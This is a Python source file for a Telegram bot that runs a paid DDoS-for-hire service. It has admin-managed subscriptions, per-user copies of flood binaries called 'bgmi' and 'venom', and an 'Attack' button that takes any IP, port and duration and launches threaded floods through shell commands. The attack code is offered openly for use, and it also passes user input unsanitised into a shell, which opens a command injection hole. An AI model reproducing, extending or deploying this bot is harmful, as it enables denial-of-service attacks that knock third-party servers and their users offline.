import telebot
import subprocess
import datetime
import os
import time
import json
import shutil
import logging
from telebot import types
from threading import Thread

# --- Configuration Loading ---
CONFIG_FILE = "config.json"

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def write_config(config_data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config_data, f, indent=4)

config = load_config()
bot = telebot.TeleBot(config['bot_token'])
ADMIN_IDS = set(config.get('admin_ids', []))
USER_FILE = config.get('user_file', 'users.json')
LOG_FILE = config.get('log_file', 'bot.log')
admin_balances = config.get('admin_balances', {})

# Original Binary Paths
ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
ORIGINAL_VENOM_PATH = None

# --- Helper Functions ---
def is_authorized(user_id):
    return user_id in ADMIN_IDS or str(user_id) in allowed_user_ids

def admin_only(func):
    def wrapper(message):
        if message.from_user.id in ADMIN_IDS:
            return func(message)
        bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
    return wrapper

def read_users():
    try:
        if not os.path.exists(USER_FILE): return {}
        with open(USER_FILE, 'r') as f:
            data = json.load(f)
            return {uid: datetime.datetime.fromisoformat(exp) for uid, exp in data.items()}
    except Exception: return {}

def write_users(users_dict):
    with open(USER_FILE, 'w') as f:
        json.dump({uid: exp.isoformat() for uid, exp in users_dict.items()}, f)

allowed_user_ids = read_users()

def log_command(user_id, target, port, duration):
    try:
        user = bot.get_chat(user_id)
        name = f"@{user.username}" if user.username else f"ID: {user_id}"
        with open(LOG_FILE, 'a') as f:
            f.write(f"User: {name} | Target: {target}:{port} | Time: {duration}s | Date: {datetime.datetime.now()}\n")
    except Exception: pass

# --- Command Handlers ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(types.KeyboardButton('🚀 Attack'), types.KeyboardButton('ℹ️ My Info'))
    bot.send_message(message.chat.id, "🔰 **WELCOME TO DDOS BOT** 🔰\nAdmins have full access.", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['add'])
@admin_only
def add_user(message):
    args = message.text.split()
    if len(args) == 3:
        user_id, days = args[1], int(args[2])
        cost = days * 100
        admin_id = str(message.from_user.id)
        
        if admin_balances.get(admin_id, 0) >= cost:
            expiry = datetime.datetime.now() + datetime.timedelta(days=days)
            allowed_user_ids[user_id] = expiry
            write_users(allowed_user_ids)
            
            admin_balances[admin_id] -= cost
            config['admin_balances'] = admin_balances
            write_config(config)

            # Copy binaries for user
            try:
                shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
                shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
                os.chmod(f'bgmi{user_id}', 0o755)
                os.chmod(f'venom{user_id}', 0o755)
            except Exception: pass

            bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
        else:
            bot.reply_to(message, "❌ Insufficient Balance.")
    else:
        bot.reply_to(message, "Usage: `/add <userId> <days>`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == '🚀 Attack')
def attack_request(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "🎯 **Enter IP, Port, and Duration:**\nExample: `1.1.1.1 80 120`", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_attack)
    else:
        bot.send_message(message.chat.id, "🚫 **Unauthorized!** Purchase a subscription.")

def process_attack(message):
    if not is_authorized(message.chat.id): return
    try:
        target, port, duration = message.text.split()
        if int(duration) > 240:
            bot.reply_to(message, "❌ Max time is 240s.")
            return

        bot.send_message(message.chat.id, f"🚀 **Attack Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`", parse_mode="Markdown")
        
        # Admin uses main binaries, Users use their copies
        u_id = str(message.chat.id)
        b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
        v_path = ORIGINAL_VENOM_PATH if message.chat.id in ADMIN_IDS else f"./venom{u_id}"

        Thread(target=run_attack_process, args=(u_id, b_path, v_path, target, port, duration)).start()
    except Exception:
        bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")

import subprocess
import time
from concurrent.futures import ThreadPoolExecutor

def execute_task(cmd):
    try:
        subprocess.run(cmd, shell=True)
    except Exception:
        pass

def run_attack_process(u_id, b_path, v_path, target, port, duration, thread_count=10):
    cmd1 = f"{b_path} {target} {port} {duration} 200"
    cmd2 = f"{v_path} {target} {port} {duration} 200"
    
    # Use ThreadPoolExecutor to scale threads
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(execute_task, cmd1)
            executor.submit(execute_task, cmd2)

    # Log command execution
    try:
        log_command(u_id, target, port, duration)
    except NameError:
        pass

# Example usage:
# run_attack_process("user1", "./bin1", "./bin2", "127.0.0.1", 80, 60, thread_count=50)

@bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
def my_info(message):
    u_id = str(message.chat.id)
    role = "Admin" if message.chat.id in ADMIN_IDS else "User"
    expiry = allowed_user_ids.get(u_id, "Lifetime" if role == "Admin" else "No Access")
    balance = admin_balances.get(u_id, 0)
    
    msg = (f"👤 **Profile Info**\n"
           f"Type: `{role}`\n"
           f"Expiry: `{expiry}`\n"
           f"Balance: `{balance} INR`")
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
@admin_only
def broadcast(message):
    msg_text = message.text.split(maxsplit=1)
    if len(msg_text) < 2: return
    for uid in allowed_user_ids.keys():
        try: bot.send_message(uid, f"📢 **Announcement:**\n{msg_text[1]}", parse_mode="Markdown")
        except Exception: pass

@bot.message_handler(commands=['stop'])
@admin_only
def stop_attack(message):
    try:
        subprocess.run(["pkill", "-9", "bgmi"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["pkill", "-9", "bgmi2"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        bot.reply_to(message, "🛑 Attack stopped successfully.")
    except Exception:
        bot.reply_to(message, "⚠️ Failed to stop attack.")

# --- Execution ---
if __name__ == '__main__':
    print("Bot is active...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=40)
        except Exception as e:
            time.sleep(5)


